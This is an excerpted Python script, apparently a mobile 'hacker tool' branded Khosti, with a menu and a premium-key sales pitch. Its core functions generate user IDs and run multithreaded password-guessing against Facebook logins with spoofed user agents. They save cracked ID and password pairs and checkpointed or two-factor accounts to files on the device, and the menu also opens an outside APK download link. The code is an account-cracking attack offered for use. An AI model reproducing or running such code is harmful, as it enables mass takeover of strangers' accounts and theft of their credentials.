...
\033[1;91m╔══════════════════════════════════════╗
\033[1;92m║        WELCOME TO MY KHOSTI HACKER TOOLS         ║     
\033[1;91m╚══════════════════════════════════════╝                                     
\033[1;91m╔══════════════════════════════════════╗
\033[1;92m║\033[1;97m[+] DEVOLPER   : \033[1;92mKhosti                ║
\033[1;92m║\033[1;97m[+] FACEBOOK   : \033[1;92mMR nizam Khosti             ║
\033[1;92m║\033[1;97m[+] WHATSAPP   : \033[1;92m+0787642167       ║
\033[1;92m║\033[1;97m[+] GITHUB     : \033[1;92mKhosti-71             ║
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                clear()
                                print(' \033[1;97mPut file example:  /sdcard/Khosti.txt  ')
                                linex()
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/Khosti_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://youtube.com/@mhKhosti8427');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        tks = ("Hi Khosti Sir, I Need To Buy Your Paid Khosti PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Khosti:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;92m════════════════════════════════════════')
                        ...
                        for psx in user:
                                ...
                                Khosti.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [Khosti] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
"Mozilla/5.0 (Linux; Android 6.0.1; XT1254 Build/MCG24.251-5-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.35.104;]"]
        try:
                ...
                for fikr in passlist:
                        ...
                        Khosti=session.cookies.get_dict().keys()
                        if "c_user" in Khosti:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [Khosti-OK] %s | %s'%(ids,pas))
                                open('/sdcard/Khosti-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Khosti:
                                if 'y' in pcp:
                                        print('\r\r\033[1;31m [Khosti-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Khosti-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [Khosti-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Khosti-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        break
                                                ...
                                                print('\r\r\033[1;31m [Khosti-2F] : '+cid+' | '+ps+ '\033[1;97m')
